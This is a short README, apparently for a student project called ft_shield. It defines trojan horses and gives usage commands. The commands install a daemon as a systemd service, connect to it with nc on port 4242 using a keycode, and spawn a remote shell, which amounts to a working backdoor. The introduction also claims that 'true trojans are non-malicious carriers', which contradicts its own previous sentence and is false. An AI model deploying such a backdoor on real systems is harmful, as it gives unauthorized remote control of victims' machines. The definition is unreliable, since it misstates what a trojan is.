## Introduction
A trojan horse is a type of malware disguised as legitimate software. While it appears harmless, it installs a hidden malicious payload on the target machine. This payload can be a virus, spyware, or keylogger and performs unauthorized actions. Antivirus programs often misuse the term "trojan" as a general label for any malware, although true trojans are non-malicious carriers..
## Usage Example
# Start the program
    $ ./ft_shield
# Verify daemon is running
    $ systemctl status ft_shield.service
# Connect to daemon
    $ nc addr_ip 4242
    Keycode: 42
    $> shell
    Spawning shell on port 4242
